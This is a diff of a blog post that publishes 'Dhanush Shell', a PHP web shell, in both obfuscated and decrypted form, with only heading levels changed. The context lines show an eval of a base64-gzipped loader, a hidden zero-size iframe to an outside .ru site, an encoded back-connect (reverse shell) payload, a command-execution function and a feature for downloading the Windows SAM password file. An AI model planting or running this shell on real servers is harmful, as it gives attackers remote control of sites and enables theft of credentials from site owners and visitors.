@@ -13,7 +13,7 @@ tags:
 ---
 Dhanush Shell. Coded By Arjun. An Indian Hacker.
 
-## Dhanush Shell Source Code (encrypted)
+### Dhanush Shell Source Code (encrypted)
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?php
 //========================================//
@@ -223,7 +223,7 @@ eval("?&gt;".gzuncompress(base64_decode($bhart)));
 &lt;iframe width=0px height=0px frameborder=no name=frame1 src=http://fightagent.ru&gt; &lt;/iframe&gt;
 </pre>
 
-## Dhanush Shell Source Code (decrypted)
+### Dhanush Shell Source Code (decrypted)
 
 <pre class="brush: php; title: ; notranslate" title="">&lt;?php
 $back_connect_p = "eNqlU01PwzAMvVfqfwjlkkpd94HEAZTDGENCCJC2cRrT1DUZCWvjqk5A/fcs3Rgg1gk0XxLnPT/bsnN60rZYthdKt4vKSNC+53sqL6A0BCuMCEK6EiYi4O52UZSQCkTHkoCGMMeKk/Llbdqd+V4dx4jShu7ee7PQ0TdCMQrDxTKxmTEqF2ANPe/U+LtUmSDdC98ja0NYOe1tTH3Qrde/md8+DCfR1h0/Du7m48lo2L8Pd7FxClqL1FDqqoxcWeE3FIXmNGBH2LMOfum1mu1aJtqibCY4vcs/Cg6AC06uKtIvX63+j+CxHe+pkLFxhUbkSi+BsU3eDQsw5rboUcdermergYZR5xDYPQT2DoFnn8OQIsvc4uw2NU6TLKPTwOokF0EUtJJgFu5r4wlFSRT/2UOznuJfOo2k+l+hdGnVmv4Bmanx6Q==";
@@ -876,7 +876,7 @@ function godir($dir) {
 		return stripslashes($text); 
 	}
 
-##################################
+###################################################
 function execmd($cmd,$d_functions="None")
 {
     if($d_functions=="None") 
@@ -5849,7 +5849,7 @@ epair\sam&gt;&lt;b&gt;&lt;font class=txt&gt;Download password file&lt;/font&gt;&
                     ?&gt;
 </pre>
 
-## Dhanush Shell screenshot<figure id="attachment_447" style="width: 604px;" class="wp-caption aligncenter">
+### Dhanush Shell screenshot<figure id="attachment_447" style="width: 604px;" class="wp-caption aligncenter">
 
 [<img src="{{ site.baseurl }}/wp-content/uploads/2014/02/dhanush-shell-1024x658.png" alt="Dhanush shell screenshot" width="604" height="388" class="size-large wp-image-447" />][1]<figcaption class="wp-caption-text">Dhanush shell screenshot</figcaption></figure>
 
